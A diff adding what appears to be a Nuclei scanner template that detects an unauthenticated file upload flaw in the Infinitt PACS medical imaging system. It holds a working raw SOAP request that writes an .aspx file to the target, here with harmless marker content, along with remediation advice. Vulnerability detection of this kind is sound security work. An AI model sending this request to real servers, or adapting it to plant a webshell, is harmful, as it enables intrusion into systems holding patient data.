@@ -1,0 +1,50 @@
+id: infinitt-pacs-file-upload-vuln
+
+info:
+  name: Infinitt PACS System File Upload Vulnerability
+  author: adeljck
+  severity: critical
+  description: |
+    Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.
+  remediation: |
+    Ensure that file uploads are properly validated and sanitized. Implement strict access controls and monitoring to detect and prevent unauthorized file uploads.
+
+variables:
+  filename: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Content-Length: 397
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>{{filename}}.aspx</fileName>
+        <bufValue>MTIz</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<jobUploadResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
